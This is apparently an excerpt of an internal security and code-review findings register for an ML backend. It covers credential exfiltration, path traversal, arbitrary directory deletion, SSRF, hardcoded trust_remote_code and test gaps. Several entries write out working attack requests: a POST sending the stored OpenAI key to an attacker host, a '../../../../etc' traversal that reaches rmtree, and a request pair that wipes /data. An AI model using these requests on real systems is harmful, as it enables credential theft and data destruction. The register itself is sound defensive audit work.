- **Claim:** A duplicate `extraction:failed` emit sends the key `"error"` where the frontend expects `"error_message"`. The store spread-merges the payload, so `error_message: undefined` overwrites the real message and nothing triggers a refetch. The parallel defect at `:1836` blanks the completion counts and sends `status: "extracting"` on a finished job.
- **Failure scenario:** An extraction fails — including the OOM path, whose whole value is its diagnostics — and the UI shows a failed job with no reason at all. The information exists server-side and is destroyed in transit by a key name.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-12 (WebSocket emission standardization) — the IDL this violates
- **Verification (R3):** pending — belongs to P09's cross-check of emitter payloads against consumer expectations
- **Proposed remediation:** Fix both keys; then, per IDL-12, type the emit payloads so a key rename cannot pass silently.
- **Effort:** S

---

### MIS-E2E-068 — Three more service defects: fabricated progress, prompt truncation, hot-path logging
- **Phase / Round:** P02 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `extraction_service.py:1612`; `steering_service.py:1411`; `steering_service.py:1170`
- **Claim:**
  1. **Fabricated progress.** During the sampling phase, `features_extracted: int(latent_dim * progress)` reports a count of features that have **not been written** — zero rows exist. When the write phase begins the counter jumps *backwards* to 0.
  2. **Silent prompt truncation.** `max_length = 2048 - params.max_new_tokens` ignores the model's real context window and truncates the prompt. At the schema-allowed `max_new_tokens=2048` the prompt is truncated to **zero tokens**, and the request still runs.
  3. **Hot-path logging.** A `logger.info` inside the steering hook fires on every forward pass — hundreds of lines and list rebuilds per generation.
  - (1) and (2) share a shape with the rest of this phase: a number the user reads as real that is not, and an input silently discarded rather than rejected.
- **Evidence:** plausible (read-only)
- **Doc reference:** none
- **Verification (R3):** pending
- **Proposed remediation:** Report written rows only; read the context window from the model config and 422 on an impossible combination; drop the log to `debug`.
- **Effort:** S

---

### MIS-E2E-069 — An unauthenticated POST exfiltrates the stored OpenAI key to any host
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/labeling.py:490-524` (`POST /api/v1/labeling/models/openai`)
- **Claim:** The handler takes a fully caller-chosen `endpoint_url` from the request body. If the body omits `api_key`, it **reads `openai_api_key` from `app_settings`, decrypts it**, and attaches it as `Authorization: Bearer <key>` to a `GET {endpoint_url}/v1/models`. The only URL check is a scheme test for `http`/`https` — `validate_llm_endpoint_url` is **never called on this path**. Confirmed: the validator has exactly two call sites in the entire tree (`schemas/labeling.py:168`, `settings.py:147`), neither of them here.
- **Failure scenario:** One request:
  ```
  POST /api/v1/labeling/models/openai
  {"endpoint_url": "https://collector.attacker.tld"}
  ```
  The backend decrypts the operator's real OpenAI key and sends it to the attacker's host in an `Authorization` header. **The omission of `api_key` is what triggers the exfiltration** — the fallback chain exists to be convenient and its convenience is the vulnerability. Every control the product offers around this credential — AES-256-GCM at rest, masking on every read, the Settings PIN — is bypassed by a single POST that never touches the settings API. The same request is also the SSRF the validator was written to prevent (`endpoint_url=http://169.254.169.254`).
- **Evidence:** **verified-by-live-repro at source** — the fallback decrypt (`:492-503`), the scheme-only check (`:508-512`), the header construction (`:521-523`), and the validator's two-call-site inventory all read directly
- **Doc reference:** PADR IDL-20 (AES-256-GCM), IDL-22 (security hardening); `utils/url_validation.py` docstring
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Two independent fixes, both needed. (1) Call `validate_llm_endpoint_url` here. (2) More importantly, **never fall back to a stored credential for a host the request body chose** — attach the stored key only when the resolved host matches the configured `openai_compatible_endpoint` or `api.openai.com`; otherwise send no `Authorization` header at all.
- **Effort:** S

---

### MIS-E2E-070 — Path traversal in extraction delete gives arbitrary directory removal
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/services/activation_service.py:1020` (`self.activations_dir / extraction_id`), `:1026` (`shutil.rmtree`); caller `backend/src/api/v1/endpoints/models.py:1197-1220`; schema `backend/src/schemas/model.py:359`
- **Claim:** `delete_extraction` joins a caller-supplied id onto the activations root with no containment check, no `resolve_user_path`, and no format validation. `Path.__truediv__` does not normalise `..`, and both `Path.exists()` and `shutil.rmtree()` resolve it through the OS. The schema is a bare `List[str]` with `min_length=1` and no pattern.
- **Failure scenario:** Verified at source — **the filesystem delete sits outside the `if extraction:` database guard.** The DB lookup at `models.py:1201-1210` runs first and is simply skipped when nothing matches; execution falls through to `activation_service.delete_extraction(extraction_id)` at `:1214` with the raw request string. So:
  ```
  DELETE /api/v1/models/<any-existing-model-id>/extractions
  {"extraction_ids": ["../../../../etc"]}
  ```
  resolves to `/data/activations/../../../../etc`, finds it exists, and `rmtree`s it as the backend user. Any directory that user can write is destroyable — `/data` itself, the model store, the SAE store, the Postgres volume. The `except` at `:1217` logs a warning and `deleted_ids.append(extraction_id)` runs regardless, so **the endpoint reports success either way**. The same unvalidated join is a read primitive at `activation_service.py:982`.
- **Evidence:** **verified-by-live-repro at source** — the join, the missing guard placement, the schema, and the swallow-and-report-success all read directly. Not executed: destroying a directory is the thing being reported.
- **Doc reference:** PADR IDL-22 (Security Hardening — Path Injection) — the IDL this violates
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Route the id through `settings.resolve_user_path()` (the correct, containment-checking resolver that already exists at `config.py:404`) **and** reject any `extraction_id` not matching `^[A-Za-z0-9_-]+$` at the schema, **and** move the filesystem delete inside the `if extraction:` block so only an id that resolved to a real row can reach an `rmtree`. Three cheap layers, because this one deletes things.
- **Related:** MIS-E2E-006 — the hardened resolver having one caller is exactly why this site does not use it
- **Effort:** S

---

### MIS-E2E-071 — User-writable path columns reach `rmtree`, enabling deletion of the whole data volume
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/schemas/dataset.py:29,45` (`raw_path`), `backend/src/schemas/model.py:37-38` (`file_path`, `quantized_path`); `dataset_service.py:226-247` and `model_service.py:207-210` (blind `setattr`); sinks `workers/dataset_tasks.py:1433-1438`, `api/v1/endpoints/models.py:161-171`
- **Claim:** `raw_path`, `file_path` and `quantized_path` are exposed as free-form `Optional[str]` on the **create and update** schemas, with only a `max_length=512`. Both update services blind-apply every submitted field via `setattr` over `model_dump(exclude_unset=True)`. On delete, the stored path is read back and handed to a worker that `rmtree`s it after `settings.resolve_data_path()` — which is **not a containment check**. Verified at `config.py:391-393`: `if path_obj.is_absolute(): if path_obj.exists(): return path_obj` — an existing absolute path is returned verbatim.
- **Failure scenario:** Two unauthenticated requests:
  ```
  POST   /api/v1/datasets   {"name":"x","source":"Local","raw_path":"/data"}
  DELETE /api/v1/datasets/<id>
  ```
  `delete_dataset` returns `raw_path="/data"`, the Celery worker resolves it (absolute, exists → returned as-is) and `shutil.rmtree("/data")` — every model, SAE, checkpoint, activation store and J-lens artifact. Nothing in either request looks suspicious to a schema validator. `PATCH /api/v1/models/{id} {"file_path":"/data"}` + `DELETE` is the same primitive through the model plane, and `POST /models/{id}/redownload` triggers it **synchronously in the API process**.
- **The underlying design fault:** the code treats "came from a DB row" as equivalent to "system-generated". That holds only while no API can write the row, and three schemas can. `sae_manager_service.py:712` has the identical pattern and is safe **today** purely because `local_path` happens not to be exposed — one field addition away from the same bug.
- **Evidence:** **verified-by-live-repro at source** — the three schema fields, the blind `setattr`, and `resolve_data_path`'s absolute-path passthrough all read directly
- **Doc reference:** PADR IDL-22
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Remove these fields from the create/update schemas — nothing legitimate sets them over the API; the download workers write them. Then make every deletion sink re-assert containment with `resolve_user_path` immediately before `rmtree`. **The database is not a trust boundary while any API can write to it.**
- **Effort:** M

---

### MIS-E2E-072 — The plaintext OpenAI key is written to disk in generated Postman collections
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** **P0**
- **Type:** security
- **Location:** `backend/src/services/openai_labeling_service.py:406` and `:645`
- **Claim:** `_save_request_for_testing` writes debug artifacts to `data_dir/tmp_api/`. The **cURL** branch was deliberately hardened — `:335-339` carries the comment *"NEVER write the real bearer token to disk — these files are debug artifacts that get checked into bug reports / shared"* and emits a `$OPENAI_API_KEY` placeholder. The **Postman** branch, sixty lines below in the same function, writes `f"Bearer {self.api_key}"` — the real decrypted key — into the JSON. The identical block is duplicated verbatim in `_save_poor_quality_debug` at `:642-646`.
- **Failure scenario:** `export_format` defaults to `"both"`, so **the default path writes the plaintext key** — the fix applied to cURL is bypassed by the default. One file is written per feature labelled, so a single run scatters hundreds of copies of the key across the persistent `/data` volume, which is mounted into the backend and Celery pods and included in backups. The scenario the cURL comment anticipates — attaching the artifact to a bug report — then ships the key to wherever that report goes.
- **Evidence:** verified-by-live-repro (both blocks and the hardened cURL comment read; `export_format` default traced to `schemas/labeling.py:98`)
- **Doc reference:** PADR IDL-20; the in-code comment at `:335-339` is the project's own statement of the rule this violates
- **Verification (R3):** **CONFIRMED in code; NOT materialised on this machine.** The sweep was run: `tmp_api/` holds 27 files across three labeling runs, including **9 Postman collections**, and **not one contains an `Authorization` header** — zero matches for the string across every file. Those runs used a keyless local endpoint, so the `if self.api_key and self.api_key not in ["not-needed","dummy-key-not-required"]` guard skipped the header entirely. The defect is real and fires the first time a real OpenAI key is used with `save_requests_for_testing`; it has not yet fired here. Recorded precisely because "sweep and rotate" was the proposed remediation and the sweep came back clean — the urgency is lower than the finding first implied, and the register should say so.
- **Proposed remediation:** Emit `Bearer {{OPENAI_API_KEY}}` (a Postman variable) in both writers. Add a regression test that scans every file produced by both functions **across all three `export_format` values** for the key — the existing coverage evidently exercised only the cURL branch. Then sweep and rotate: three `tmp_api/` directories already exist in this working tree.
- **Effort:** S
- **Note:** this is the "fixed one representative, never generalized" anti-pattern, with the two sites sixty lines apart in one function.

---

### MIS-E2E-073 — `PUT /settings/bulk` skips the URL validation the single-key route applies
- **Phase / Round:** P02 / R1
- **Source:** /security-review (flagged as unverified; verified here)
- **Severity:** P2
- **Type:** security
- **Location:** `backend/src/api/v1/endpoints/settings.py:166-190` vs `:143-149`
- **Claim:** `PUT /settings` validates `ollama_url` and `openai_compatible_endpoint` through `validate_llm_endpoint_url` before upserting. `PUT /settings/bulk` calls `AppSettingService.upsert(db, item)` directly in a loop with **no URL validation at all**. Notably the *other* hardening — the expunge-before-mask fix, with its explanatory comment — **is** correctly duplicated into the bulk path. One of the two protections was carried across and the other was not.
- **Failure scenario:** The SSRF guard on the two endpoint keys is bypassed by sending them through `/bulk` instead. Those keys are subsequently used unvalidated by the labeling and enhanced-labeling paths, which is precisely why the validator exists on the single-key route.
- **Evidence:** **verified-by-live-repro at source** — both handlers read in full; the reviewer explicitly flagged this as unchecked and it was checked
- **Doc reference:** PADR IDL-22
- **Verification (R3):** **CONFIRMED at R1**
- **Proposed remediation:** Extract the validation into `AppSettingService.upsert` so neither route can forget it — a guard on the caller is a guard someone will not copy.
- **Effort:** S

---

### MIS-E2E-074 — `trust_remote_code=True` is hardcoded in three services, overriding the user's download-time choice
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** P1
- **Type:** security
- **Location:** `services/steering_service.py:899,921`; `services/logit_lens_service.py:351,361`; `services/local_labeling_service.py:84,92`
- **Claim:** The download plumbing treats remote-code execution as an explicit opt-in defaulted **off**: `ModelDownloadRequest.trust_remote_code` defaults `False`, `ml/model_loader.py:184` defaults `False` and threads the caller's value into every `from_pretrained`, and `workers/model_tasks.py:237` respects it. Three services discard that and hardcode `True`.
- **Failure scenario:** A user evaluates an untrusted community fine-tune and leaves `trust_remote_code` unchecked — whose documented meaning is *"do not run code from this repo"*. Download executes nothing, but `snapshot_download` still writes the repo's `modeling_*.py` to disk. The first steering run then calls `AutoModelForCausalLM.from_pretrained(load_path, trust_remote_code=True)`, transformers imports that file, and arbitrary Python executes in the GPU worker — which holds `/data` write access, the Celery broker and the DB credentials. **The safety flag is a property of which subsystem touches the model next, not of the model**, and the user is never told.
- **Evidence:** plausible (read-only) — all six hardcode sites and the defaulted-off plumbing read; not executed
- **Doc reference:** PADR IDL-3 (multi-architecture SAE support), IDL-13 (dynamic layer discovery)
- **Verification (R3):** pending
- **Proposed remediation:** Persist the download-time decision on the `Model` row and read it in all three services. Add a test asserting the flag reaching `from_pretrained` is `False` for such a row — and mutate it to `True` as a negative control, since a test that only checks "loading succeeded" passes against both.
- **Effort:** M

---

### MIS-E2E-075 — Unvalidated `judge_endpoint`, and a manifest slot reserved for a credential
- **Phase / Round:** P02 / R1
- **Source:** /security-review
- **Severity:** P2
- **Type:** security
- **Location:** `backend/src/services/circuit_calibration_service.py:48-69` (`create_config`), `:449` (client construction), `:164` (manifest payload); `api/v1/endpoints/circuits.py:325`; `mcp_server/tools/circuits.py:371`
- **Claim:** `CalibrationBody.judge_endpoint` is free-form per-request input, copied into the config with **no validation — not even a scheme check** — and handed to an `OpenAI` client that POSTs from inside the GPU Celery worker. `validate_llm_endpoint_url` is not on this path. The MCP tool `calibrate_circuit_strength` exposes the same parameter to agents. Separately, `create_config` reserves a `judge_api_key` slot at `:69` and the **whole config dict** is written verbatim into the persisted calibration manifest at `:164`.
- **Failure scenario:** The SSRF half is genuinely limited (POST-only to a `/chat/completions` path, and RFC1918/loopback are permitted by policy anyway) — Medium, not High. The larger risk is the second half: manifests are designed to travel, are read over MCP (`get_validation_manifest`) and re-run by `reproduce_calibration`. Today `CalibrationBody` has no `judge_api_key` field so pydantic drops it and the value is always `None` — **the credential-in-manifest is latent, one field addition away from live**, in a document whose stated purpose is portability.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-37 (calibration), IDL-34 (manifest reproducibility)
- **Verification (R3):** pending
- **Proposed remediation:** Validate the endpoint. Build the manifest config from an **explicit allow-list of keys**, not `cfg` wholesale. And extend `manifest_service._assert_no_paths` — which already walks payloads rejecting `/data/` and `/home/` strings — into an `_assert_no_secrets` that rejects keys matching `*key*`/`*token*`/`*secret*`. The guard shape already exists; it just does not cover this class.
- **Effort:** M

---

### MIS-E2E-076 — IDL-38's "one steering core" is two; the user-facing path is the unmigrated one
- **Phase / Round:** P02 / R1
- **Source:** /review (IDL conformance)
- **Severity:** P2
- **Type:** debt
- **Location:** `backend/src/services/steering_core.py` (317 lines, `build_steer_generator`) vs `backend/src/services/steering_service.py:1127` (`_create_steering_hook`) and `:1273` (`_register_steering_hooks`)
- **Claim:** PADR IDL-38 is titled *"Steered transcript recorder — **one steering core**, general recorder, transcript-carrying manifests"*, and `steering_recorder_service.py:10` states it is *"Built on the unified `steering_core` (the same generation core calibration uses)"*. In practice `build_steer_generator` has exactly **two** consumers — the recorder and `circuit_calibration_service`. Every user-facing steering path (`/steering/compare`, `/steering/sweep`, `/steering/combined`, the Steering panel) runs `steering_service`'s **own independent** hook implementation. There are two steering cores, and the one the product's primary feature uses is not the unified one.
- **Failure scenario:** Not a runtime bug — an explanation for a class of them. Every steering fix must now be applied twice, and the record shows it is not: MIS-E2E-064 (compare and sweep steering in the wrong SAE basis) is a defect of the `steering_service` path that was fixed only for `combined`, while MIS-E2E-065 (a negative dial silently returning baseline) is a defect of the `steering_core` path. The two implementations have **different bugs**, which is the signature of a duplication that the docs record as resolved.
- **Refuted sub-hypothesis, recorded so it is not re-run:** the sharpest version of this — that the hardware-only hook-target fix (*"additive steering MUST hook `structure.layers_module[L]` (resid_post), not the discovered `"residual"` RMSNorm, which renormalizes the vector away"*) reached only `steering_core` — is **false**. `steering_service._get_target_module:1113-1117` calls `discover_transformer_structure` and returns `layers_module[layer]`, the whole decoder layer. Both implementations hook the correct target. That fix was generalized; the SAE-routing fix was not.
- **Evidence:** verified-by-live-repro — consumer grep for `build_steer_generator`; both hook-target resolutions read
- **Doc reference:** PADR IDL-38; memory `steering-hook-target-whole-layer`
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Migrate `steering_service`'s compare/sweep/combined onto `build_steer_generator`, which is what IDL-38 already says happened. Until then, treat every steering finding as "which of the two?" and check both — and amend IDL-38 to describe what shipped.
- **Effort:** L

---

## P02 — R2 (adversarial re-review + mutation controls)

---

### MIS-E2E-077 — The force-encryption control for credentials has no test
- **Phase / Round:** P02 / R2
- **Source:** mutation control M7
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/services/app_setting_service.py:22` (`_SENSITIVE_KEYS`), `:45` (`is_sensitive = data.key in _SENSITIVE_KEYS or data.is_sensitive`)
- **Claim:** Removing `openai_api_key` from `_SENSITIVE_KEYS` left **40 tests green**. That frozenset is the server-side guarantee that a credential is encrypted at rest **regardless of what the client claims** — with it gone, a request carrying `is_sensitive: false` stores the operator's OpenAI key in plaintext in `app_settings`.
- **Failure scenario:** The control is correct and unprotected. R1's `/security-review` listed it under "verified clean" and described it accurately — *"forces encryption server-side regardless of the client's `is_sensitive` flag (blocking a plaintext downgrade)"*. Reading established that the control exists and is right; only breaking it established that nothing keeps it right. A refactor that reorganises the set, or a new credential key added without being added here, silently stores plaintext with a green suite.
- **Evidence:** **verified-by-mutation** — M7 landed (1 deletion confirmed), suite green, restore verified clean
- **Doc reference:** PADR IDL-20 (DB-backed settings with AES-256-GCM)
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** A test that upserts each `_SENSITIVE_KEYS` member with `is_sensitive: false` and asserts the stored column is **not** the plaintext value. Parametrize it over the set so a newly added key inherits the coverage instead of needing to be remembered.
- **Effort:** S

---

### MIS-E2E-078 — The hardware-only steering hook-target fix is unpinned on both implementations
- **Phase / Round:** P02 / R2
- **Source:** mutation controls M8 and M9
- **Severity:** P1
- **Type:** test-gap
- **Location:** `backend/src/services/steering_service.py:1113-1117` (`_get_target_module`); `backend/src/services/steering_core.py:236`
- **Claim:** Regressing the steering hook target from the whole decoder layer back to a norm submodule — the historically-wrong target — leaves the suite green on **both** paths: 84 tests for `steering_service`, 200 for `steering_core`.
- **Failure scenario:** This is the Recorder increment's headline defect (commit 91b5a6c). Additive steering must hook `structure.layers_module[L]` (resid_post); hooking the discovered `"residual"` module — a post-attention RMSNorm on LFM2 — **renormalises the steering vector away**, producing `steered == unsteered at every dial`. Four static review rounds and the whole unit suite missed it originally; only a hardware run found it. Nothing has changed: the regression is still invisible to the suite, on both implementations.
  `steering_core.py:229-236` carries a detailed comment explaining exactly why the RMSNorm target is wrong and that hooking the layer output *"survives, so the recorded transcript matches what miLLM serves."* **The trap is documented in prose and enforced by nothing.**
- **Evidence:** **verified-by-mutation** — M8 and M9 both landed (confirmed by `git diff --stat`), both suites green, both restores verified clean
- **Doc reference:** PADR IDL-38; memory `steering-hook-target-whole-layer`; commit 91b5a6c
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** A test asserting the module handed to `register_forward_hook` **is** `structure.layers_module[L]` and is not a norm submodule — cheap, needs no GPU, and would have failed before the hardware round. Add it to both implementations while both exist (MIS-E2E-076). Then re-run this mutation as a negative control to prove the new test bites.
- **Effort:** S
- **Note:** the standing rule — *mutate the previous round's fix; if it does not fail loudly, that round produced an unpinned fix* — is satisfied here in the negative, for a fix that cost a hardware round to find.
